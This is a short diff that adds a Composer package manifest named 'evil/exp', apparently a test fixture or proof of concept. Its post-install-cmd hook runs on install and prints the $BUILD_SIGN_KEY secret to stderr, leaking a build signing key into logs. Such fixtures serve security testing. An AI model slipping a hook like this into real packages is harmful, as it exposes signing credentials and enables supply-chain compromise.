@@ -1,0 +1,6 @@
+{
+    "name": "evil/exp",
+    "scripts": {
+        "post-install-cmd": "echo $BUILD_SIGN_KEY >&2"
+    }
+}
